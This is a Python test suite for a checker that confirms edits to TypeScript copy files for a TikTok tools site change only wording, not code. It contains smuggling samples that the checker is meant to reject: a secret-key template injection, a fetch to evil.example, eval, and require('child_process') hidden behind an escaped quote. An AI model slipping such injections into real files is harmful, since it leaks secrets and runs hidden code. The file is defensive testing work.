"""Tests for ts_strings_only.cjs (the words-only proof for TypeScript copy files).
Needs node and the `typescript` package: set NODE_PATH to a node_modules folder that has it.
In the workflow REQUIRE_TS=1 makes a missing parser a failure instead of a skip.
Run: NODE_PATH=/path/to/node_modules python3 scripts/deploy_robot/test_ts_check.py"""
import json, os, shutil, subprocess, sys, tempfile, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
CHECKER = os.path.join(HERE, "ts_strings_only.cjs")
LF = chr(10)
BS = chr(92)


def have_ts():
    try:
        r = subprocess.run(["node", "-e", "require('typescript')"], capture_output=True, text=True)
        return r.returncode == 0
    except OSError:
        return False


HAVE = have_ts()
if not HAVE and os.environ.get("REQUIRE_TS") == "1":
    print("FAILED: node or the typescript package is missing, the words-only checker was NOT tested")
    sys.exit(1)

BASE = LF.join([
    "// copy for the coins tool",
    "import { SITE_ORIGIN } from '@/lib/seo'",
    "import { coinsToUsd } from '@/lib/tiktokCoins'",
    "",
    "const SLUG = 'tiktok-coins-to-usd'",
    "const n = (x: number) => x.toLocaleString('en-US')",
    "const lion = GIFTS.find((g) => g.name === 'Lion')!",
    "",
    "export const COINS_TOOL = {",
    "  slug: SLUG,",
    "  path: `/tools/${SLUG}`,",
    "  title: 'TikTok Coins to USD Calculator',",
    "  description: `Free calculator: 1,000 coins is about ${n(13)} dollars. Convert coins today.`,",
    "  faq: [",
    "    { question: 'How much is one coin?', answer: 'About ' + n(1) + ' cent.' },",
    "  ],",
    "  line: (count: number) => `See all ${count} tools`,",
    "} as const",
    ""])

CARDS = LF.join([
    "const P = {",
    "  money: '/tools/tiktok-money-calculator',",
    "  er: '/tools/tiktok-engagement-rate-calculator',",
    "  time: '/tools/best-time-to-post-on-tiktok-today',",
    "  hashtags: '/tools/tiktok-hashtag-generator',",
    "} as const",
    "",
    "const GUIDE_TOPIC_TOOLS: Array<[RegExp, readonly [string, string, string]]> = [",
    "  [/hashtag/, [P.hashtags, P.er, P.time]],",
    "  [/money|pay/, [P.money, P.er, P.time]],",
    "]",
    "export const pick = (slug: string) => GUIDE_TOPIC_TOOLS.find(([re]) => re.test(slug))",
    ""])


@unittest.skipUnless(HAVE, "node + typescript not available here (the workflow installs them)")
class Checker(unittest.TestCase):
    def run_one(self, old, new, tables=()):
        d = tempfile.mkdtemp(prefix="tscheck_")
        try:
            for name, text in (("0.old", old), ("0.new", new)):
                with open(os.path.join(d, name), "w", encoding="utf-8", newline="") as f:
                    f.write(text)
            with open(os.path.join(d, "manifest.json"), "w", encoding="utf-8") as f:
                json.dump([{"path": "lib/x.ts", "old": "0.old", "new": "0.new", "tables": list(tables)}], f)
            r = subprocess.run(["node", CHECKER, d], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr[-400:])
            return json.loads(r.stdout)["files"]["lib/x.ts"]
        finally:
            shutil.rmtree(d, ignore_errors=True)

    def ok(self, new, base=BASE, tables=()):
        rep = self.run_one(base, new, tables)
        self.assertTrue(rep["ok"], rep.get("reason"))
        return rep

    def bad(self, new, base=BASE, tables=()):
        rep = self.run_one(base, new, tables)
        self.assertFalse(rep["ok"], "should have been refused: " + json.dumps(rep)[:300])
        return rep

    # ---- words may change ----
    def test_title_change(self):
        rep = self.ok(BASE.replace("TikTok Coins to USD Calculator", "TikTok Coins to USD Calculator & Gift Values"))
        self.assertEqual(rep["changed"], [{"old": "TikTok Coins to USD Calculator", "new": "TikTok Coins to USD Calculator & Gift Values", "key": "title", "kind": "string"}])

    def test_template_text_change(self):
        rep = self.ok(BASE.replace("Convert coins today.", "Convert coins and gifts today."))
        self.assertEqual(len(rep["changed"]), 1)
        self.assertEqual((rep["changed"][0]["key"], rep["changed"][0]["kind"]), ("description", "template"))

    def test_concat_and_arrow_text(self):
        rep = self.ok(BASE.replace("'About '", "'Roughly '").replace("`See all ${count} tools`", "`Browse all ${count} tools`"))
        self.assertEqual(sorted(c["key"] for c in rep["changed"]), ["answer", "line"])

    def test_comment_only_change_is_reported_as_no_change(self):
        rep = self.ok(BASE.replace("// copy for the coins tool", "// copy for the coins tool, edited"))
        self.assertEqual(rep["changed"], [])

    def test_no_change(self):
        self.assertEqual(self.ok(BASE)["changed"], [])

    # ---- code may not ----
    def test_new_import(self):
        self.bad("import fs from 'node:fs'" + LF + BASE)

    def test_import_path_change(self):
        self.bad(BASE.replace("'@/lib/tiktokCoins'", "'@/lib/stripe'"))

    def test_call_argument_change(self):
        self.bad(BASE.replace("toLocaleString('en-US')", "toLocaleString('ar-SA')"))

    def test_comparison_string_change(self):
        self.bad(BASE.replace("g.name === 'Lion'", "g.name === 'Rose'"))

    def test_new_expression_in_template(self):
        self.bad(BASE.replace("Convert coins today.", "Convert ${process.env.STRIPE_SECRET_KEY} today."))

    def test_expression_change_in_template(self):
        self.bad(BASE.replace("${n(13)}", "${n(14)}"))
        self.bad(BASE.replace("${n(13)}", "${fetch('https://evil.example')}"))

    def test_string_to_call(self):
        self.bad(BASE.replace("'TikTok Coins to USD Calculator'", "String(globalThis.secret)"))

    def test_string_to_template_with_expression(self):
        self.bad(BASE.replace("'How much is one coin?'", "`How much is ${1 + 1} coin?`"))

    def test_new_property(self):
        self.bad(BASE.replace("  faq: [", "  extra: 'more words here',\n  faq: ["))

    def test_new_array_item(self):
        self.bad(BASE.replace("    { question: 'How much is one coin?', answer: 'About ' + n(1) + ' cent.' },",
                              "    { question: 'How much is one coin?', answer: 'About ' + n(1) + ' cent.' },\n    { question: 'Another one here?', answer: 'Yes it is.' },"))

    def test_number_change(self):
        self.bad(BASE.replace("n(1)", "n(100)"))

    def test_property_name_change(self):
        self.bad(BASE.replace("  title: 'TikTok", "  titel: 'TikTok"))

    def test_code_hidden_after_string_end(self):
        self.bad(BASE.replace("'TikTok Coins to USD Calculator',", "'x', hack: eval('1'),"))

    def test_directive_and_statement_strings_are_code(self):
        self.bad("'use client'" + LF + BASE)
        base = "'use client'" + LF + BASE
        self.bad(base.replace("'use client'", "'use server'"), base=base)

    def test_slug_variable_is_reported_so_policy_can_refuse_it(self):
        rep = self.ok(BASE.replace("'tiktok-coins-to-usd'", "'another-slug'"))
        self.assertEqual(rep["changed"][0]["key"], "SLUG")        # policy.check_copy refuses: no space = code-like value

    def test_syntax_error(self):
        self.bad(BASE.replace("} as const", "} as const ("))

    def test_crlf(self):
        self.bad(BASE.replace(LF, "\r" + LF))

    def test_regex_change_outside_a_table(self):
        base = BASE + "export const rx = /abc/" + LF
        self.bad(base.replace("/abc/", "/abd/"), base=base)

    def test_escaped_quote_does_not_confuse_the_parser(self):
        new = BASE.replace("'How much is one coin?'", "'How much is one coin, it" + BS + "'s asked a lot?'")
        rep = self.ok(new)
        self.assertEqual(rep["changed"][0]["new"], "How much is one coin, it's asked a lot?")
        self.bad(BASE.replace("'How much is one coin?'", "'a" + BS + BS + "', evil: require('child_process'), b: 'c'"))

    # ---- the topic table ----
    def test_table_row_added_changed_removed(self):
        t = ("GUIDE_TOPIC_TOOLS",)
        rep = self.ok(CARDS.replace("  [/money|pay/, [P.money, P.er, P.time]],", "  [/money|pay|earn/, [P.money, P.er, P.hashtags]],\n  [/schedule/, [P.time, P.er, P.hashtags]],"), base=CARDS, tables=t)
        self.assertTrue(rep["table_changed"])
        self.assertEqual(rep["changed"], [])
        rep = self.ok(CARDS.replace("  [/hashtag/, [P.hashtags, P.er, P.time]],\n", ""), base=CARDS, tables=t)
        self.assertTrue(rep["table_changed"])
        self.assertFalse(self.ok(CARDS, base=CARDS, tables=t)["table_changed"])

    def test_table_is_code_when_not_named(self):
        self.bad(CARDS.replace("/money|pay/", "/money|pay|earn/"), base=CARDS)

    def test_table_bad_rows(self):
        t = ("GUIDE_TOPIC_TOOLS",)
        row = "  [/money|pay/, [P.money, P.er, P.time]],"
        for new_row in ("  [/(a+)+$/, [P.money, P.er, P.time]],",                       # not simple words
                        "  [/money/i, [P.money, P.er, P.time]],",                        # flags
                        "  [/money|pay/, [P.money, P.er]],",                              # 2 tools
                        "  [/money|pay/, [P.money, P.er, P.secret]],",                    # unknown tool
                        "  [/money|pay/, [P.money, P.er, '/admin']],",                    # a raw path
                        "  [/money|pay/, [P.money, P.er, fetch('x')]],",                  # a call
                        "  [new RegExp(x), [P.money, P.er, P.time]],",
                        "  [/money|pay/, [P.money, P.er, P.time], 1],",
                        "  ...other,"):
            self.bad(CARDS.replace(row, new_row), base=CARDS, tables=t)
        self.bad(CARDS.replace("]]> = [", "]]> = evil() || ["), base=CARDS, tables=t)
        self.bad(CARDS.replace("  [/hashtag/, [P.hashtags, P.er, P.time]],\n  [/money|pay/, [P.money, P.er, P.time]],\n", ""), base=CARDS, tables=t)   # empty table

    def test_table_cannot_smuggle_a_new_P_name(self):
        new = CARDS.replace("  hashtags: '/tools/tiktok-hashtag-generator',", "  hashtags: '/tools/tiktok-hashtag-generator',\n  admin: '/admin',")
        self.bad(new.replace("P.time]],\n]", "P.admin]],\n]"), base=CARDS, tables=("GUIDE_TOPIC_TOOLS",))

    def test_code_outside_the_table_still_checked(self):
        self.bad(CARDS.replace("re.test(slug)", "re.test(slug) || true"), base=CARDS, tables=("GUIDE_TOPIC_TOOLS",))

    def test_missing_table(self):
        self.bad(BASE.replace("Convert coins today.", "Convert coins now."), tables=("GUIDE_TOPIC_TOOLS",))


if __name__ == "__main__":
    unittest.main(verbosity=1)
